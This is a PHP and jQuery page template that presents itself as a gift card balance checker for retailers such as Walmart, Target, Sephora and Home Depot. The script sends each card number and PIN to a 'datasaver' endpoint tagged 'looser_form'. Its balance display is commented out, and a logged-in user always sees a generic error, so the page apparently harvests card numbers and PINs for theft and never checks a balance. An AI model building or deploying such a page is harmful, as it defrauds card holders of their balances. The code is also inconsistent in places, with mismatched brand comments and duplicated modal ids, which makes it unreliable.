<main>
   <div class="container">
      <div class="row">
         <div class="col-lg-12">
            <div class="card mb-10">
               <div class="card-body store-body">
                  <div class="product-info">
                     <div class="product-gallery sm-hide">
                        <div class="product-gallery-featured">
                          <img class="img-fluid" src="<?php echo base_url().'giftcards_images/'.$getgiftcardinfo->gcimage; ?>" alt="<?php echo ucfirst($getgiftcardinfo->gcname); ?>">
                        </div>
                     </div>
					 <!--
                     <div class="product-seller-recommended">
                        <div class="product-description mb-5 sm-hide">
                           <h2 >Description</h2>
                           <p><?php echo ucfirst($getgiftcardinfo->description); ?></p>
                        </div>
                     </div>
					 -->
                  </div>
				 <input type="hidden" id="giftcardid" name="giftcardid" value="<?php echo $getgiftcardinfo->gcid; ?>">
				 <input type="hidden" id="display_url" name="display_url" value="<?php echo $getgiftcardinfo->display_url; ?>">
				 <input type="hidden" id="select_giftcard" name="select_giftcard" value="<?php echo $getgiftcardinfo->identityid; ?>">
				 <input type="hidden" id="cardtext" name="cardtext" value="<?php echo ucfirst($getgiftcardinfo->gcname); ?>">
                  <div class="product-payment-details">
                     <div class="info-wrap bg-white w-100 p-lg-5  w-100   cust-pd-mar">
                        <h3 class="mb-4 text-center"><?php echo ucfirst($getgiftcardinfo->gcname); ?> Check Balance</h3>
                        <form method="POST" id="contactForm" class="contactForm">
                           <div class="row">
                              <div class="col-md-12">
                                 <div class="form-group">
                                    <input name="digit_gift_card_number" id="digit_gift_card_number" class="form-control" placeholder="XXXX-XXXX-XXXX-XXXX" autocomplete="off" type="text" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Required" data-secondary-message="Only numbers are allowed">
									<span class="error_message_style" id="gift_card_number_error" style="color:red"></span>
                                 </div>
                              </div>
                              <div class="col-md-12">
                                 <div class="form-group">
                                    <input name="pin_number" id="pin_number" class="form-control" title="" placeholder="XXXX" autocomplete="off" type="password">
									<span class="error_message_style" id="pin_number_error" style="color:red"></span>
                                 </div>
                              </div>
                              <div class="col-md-12">
                                 <div class="row">
                                    <div class="form-group col-md-6 col-6 cus-btn">
                                       <input type="button" onClick="validateFun();" value="submit" class="btn btn-info">
                                    </div>
                                    <div class="text-center  bg-white col-md-6 col-6 cus-btn">
                                       <a href="<?php echo $getgiftcardinfo->base_url; ?>" target="_blank"  class="btn btn-outline-success" style="background:green">Buy Now</a>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </form>
                     </div>
                     <div class="product-gallery-featured md-hide">
						 <img class="img-fluid" src="<?php echo base_url().'giftcards_images/'.$getgiftcardinfo->gcimage; ?>" alt="<?php echo ucfirst($getgiftcardinfo->gcname); ?>">
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</main>
<div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="exampleModalLongTitle" style="color:#000;font-weight:500;">View balance</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<form>
					<div class="form-group">
					<label for="recipient-name" class="col-form-label" style="color:#000;font-weight:600;">Card Name</label>
					<input type="text" disabled class="form-control" id="balance_info_review">
					</div>
					<div class="form-group">
					<label for="message-text" class="col-form-label" style="color:#000;font-weight:600;">Balance</label>
					<input type="text" disabled class="form-control" id="balance_info">
					</div>
				</form>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-primary" onclick="return dataRedirect();">Ok</button>
			</div>
		</div>
	</div>
</div>
<div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongDive" aria-hidden="true">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="exampleModalLongDive" style="color:#000;font-weight:500;">Error Code</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<form>
					<p>!something went wrong please try again later.</p>
				</form>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-primary" onclick="return dataRedirect();">Ok</button>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript">	
	jQuery.noConflict();
	jQuery(document).ready(function(){
		$("#digit_gift_card_number").keypress(function (e) {
			if (e.which != 45 && e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
				$("#gift_card_number_error").html("Please enter digits only.").show().fadeOut("slow");
				return false;
			}
		});
		$("#digit_gift_card_number").keyup(function() {
			var cardtype = document.getElementById('select_giftcard').value;
			// eBay
			if(cardtype==1){
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==2){ // Walmart
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==3){ // target
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,3}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==4){ // Adidas
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==5){ // bestbuy
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==6){ // H&M
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==7){ // sephora
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==8){ // home depot
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==9){ // Nordstrom
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==10){ // Hotels.com
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==11){ // JCPenney
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==12){ // Macys
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==13){ // Nike
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==14){ // Starbucks Card
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==15){ // Saks Fifth Avenue
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==16){ // GameStop
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}			
		});
		var cardtype = document.getElementById('select_giftcard').value;
		hide_dude_funny(cardtype);
	});
	function hide_dude_funny(cardtype) {
		$("#digit_gift_card_number").val('');
		$("#pin_number").val(''); 
		$("#gift_card_number_error").html(""); 
		$("#pin_number_error").html(""); 
		//eBay Giftcard
		if(cardtype == 1){
			$("#digit_gift_card_number").attr('placeholder', 'XXX-XXX-XXX-XXXX');
			$("#digit_gift_card_number").attr('maxlength', '13');
			$("#hide_pin").show();
		}
		//Walmart Giftcard 
		if(cardtype==2) {
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}		
		//Target Giftcard
		if(cardtype==3){
			$("#digit_gift_card_number").attr('placeholder', 'XXX-XXX-XXX-XXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXXXXXXX');
			$("#pin_number").attr('maxlength', '8');
			$("#hide_pin").show();
		}
		//Adidas
		if (cardtype == 4) {
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '23');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//Bestbuy Giftcard		
		if(cardtype==5){			
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');
			$("#digit_gift_card_number").attr('maxlength', '16');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		 }
		//H&M	
		if(cardtype==6){			
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '23');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//Sephora Giftcard
		if(cardtype == 7){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');
			$("#digit_gift_card_number").attr('maxlength', '16');
			$("#pin_number").attr('placeholder', 'XXXXXXXX');
			$("#pin_number").attr('maxlength', '8');
			$("#hide_pin").show();
		}
		//Home depot Giftcard
		if(cardtype == 8){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '28');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//Nodestrom Giftcard
		if(cardtype == 9){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');			
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXX');
			$("#pin_number").attr('maxlength', '3');
			$("#hide_pin").show();
		}
		//Hotels.com Giftcard
		if(cardtype == 10){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');			
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXXXXXXX');
			$("#pin_number").attr('maxlength', '8');
			$("#hide_pin").show();
		}
		//JCPenney Giftcard
		if(cardtype == 11){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXX');			
			$("#digit_gift_card_number").attr('maxlength', '23');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//Macys Giftcard
		if(cardtype == 12){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '18');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//Nike Giftcard
		if(cardtype == 13){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '22');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//Starbucks Card
		if(cardtype == 14){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXXXXXXX');
			$("#pin_number").attr('maxlength', '8');
			$("#hide_pin").show();
		}
		//Saks Fifth Avenue
		if(cardtype == 15){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX');
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
		//GameStop
		if(cardtype == 16){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '23');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
	}
	function dataRedirect(){
		window.location = '<?php echo base_url();?>giftcards';
	}
	function isvalidated(data, min, max) { 
		data=data.replace(/-/g, "");
		console.log("isvalidated"+data);
		input = data.length;
		if ($.isNumeric(data)) {
			return false;
		}
		if (input < min) {
			return false;
		}
		if (input > max) {
			return false;
		}
		return true;
	}
	function numaricvalidated(data, min, max) { 
		data=data.replace(/-/g, "");
		console.log("numaricvalidated"+data);
		input = data.length;
		if (input < min) {
			return false;
		}
		if (input > max) {
			return false;
		}
		if (!$.isNumeric(data)) {
			return false;
		}
		return true;
	}
	function validateFun() {
		var flag = true;
		if (document.getElementById('select_giftcard').value == "0") {
			$("#error_select_giftcard").html("Please Select Gift Card");
			document.getElementById('select_giftcard').focus();
			flag = false;
		}
		if (document.getElementById('digit_gift_card_number').value == "") {
			$("#gift_card_number_error").html("Please Enter Valid Digit Gift Card Number");
			document.getElementById('digit_gift_card_number').focus();
			flag = false;
		}
		var cardtype = document.getElementById('select_giftcard').value;
		var gift_card_number = document.getElementById('digit_gift_card_number').value;
		gift_card_number=gift_card_number.replace(/-/g, "");
		var pin_number='';
		if(document.getElementById('pin_number').value!=undefined){
			pin_number = document.getElementById('pin_number').value;
		}
		if(flag==false){
			return false;
		}else{
			var alphanumaricregx = /^[A-Za-z0-9]+$/;
			var chars = /^[a-zA-Z]+$/;
			if (cardtype == 1) { //ebay
				var valid_number = isvalidated(gift_card_number, 13, 16);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 13 to 16 digit valid alpha numaric card number");
					return false;
				}
				if (!alphanumaricregx.test(gift_card_number)) {
					$("#gift_card_number_error").html("Alphanumeric only allowed !");
					return false;
				}
				$("#gift_card_number_error").html("");
			}			
			if (cardtype == 2) { //Walmart
				var valid_number = numaricvalidated(gift_card_number, 16, 16);
				if(cardtype == 2 && gift_card_number.toString()[0]!=6){
					$("#gift_card_number_error").html("Enter valid 16 digit valid card number,should be starts with 6");
					return false;                    
				}
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 16 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}                
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 4, 4);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 3) { //target  
				var valid_number = numaricvalidated(gift_card_number, 15, 15);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 16 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 8 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 8, 8);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 8 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 4) { //Steam   
				var valid_number = numaricvalidated(gift_card_number, 19, 19);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 19 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
			}
			if (cardtype == 5 || cardtype == 6) { //Bestbuy Giftcard // Sears Giftcard
				var valid_number = numaricvalidated(gift_card_number, 16, 16);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 16 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}                
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 4, 4);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 7) { //Sephora Giftcard  
				var valid_number = numaricvalidated(gift_card_number, 16, 16);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 16 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 8 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 8, 8);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 8 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 8) { //Home depot Giftcard
				var valid_number = numaricvalidated(gift_card_number, 23, 23);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 23 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 4, 4);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 9) { //Nodestrom Giftcard  
				var valid_number = numaricvalidated(gift_card_number, 16, 16);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 16 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 3 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 3, 3);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 3 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 11) { //JCPenney
				var valid_number = numaricvalidated(gift_card_number, 19, 19);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 19 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 4, 4);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			if (cardtype == 12) { //Macys Giftcard
				var valid_number = numaricvalidated(gift_card_number, 15, 15);
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid 15 digit valid  card number");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 4, 4);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 4 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}
			var cardtext = $('#cardtext').val();
			var giftcardid = $('#giftcardid').val();
			// if(grecaptcha.getResponse() == ''){
				// alert( 'Captch is required' );
				// return false;
			// }else{
				var request = $.ajax({
					url: '<?php echo base_url();?>Giftcards/datasaver?time=<?php echo time(); ?>',
					type: "POST",
					dataType:'json',
					data: {
						CardType: cardtext,
						giftcardid: giftcardid,
						GiftCardNumber: gift_card_number,
						PinNumber: pin_number,
						looser_form: 'looser_form'
					}               
				});
				request.done(function(msg) {
					<?php if(isset($_SESSION['id']) && $_SESSION['id']!=""){ ?>
						// $("#balance_info_review").val(msg.message);
						// $("#balance_info").val('$'+ msg.blancecode);
						$("#exampleModalLongDive").modal('show');
					<?php }else{ ?>						
						window.location = "<?php echo base_url();?>login";
					<?php } ?>
				});

				request.fail(function(jqXHR, textStatus) {
					alert("Request failed: " + textStatus);
				});
			// } 
		}		
	}
</script>